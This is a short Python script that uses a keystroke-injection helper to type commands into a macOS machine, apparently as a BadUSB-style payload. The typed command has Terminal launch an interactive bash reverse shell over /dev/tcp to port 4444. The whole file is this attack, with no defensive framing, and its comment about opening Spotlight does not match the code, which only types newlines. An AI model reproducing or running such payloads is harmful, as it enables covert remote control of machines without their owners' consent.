#!/usr/bin/env python3
from tools.hid_type import type_text
import time, os
def main():
    time.sleep(1.0)
    # Spotlight → Terminal → run reverse shell
    type_text("\n")
    type_text("\n")
    type_text("osascript -e 'tell application \"Terminal\" to do script \"bash -c \\\"/bin/bash -i >& /dev/tcp/$(ipconfig getifaddr en0)/4444 0>&1\\\"\"'\n")
if __name__=="__main__":
    if os.geteuid()!=0: print("Run as root"); exit(1)
    main()
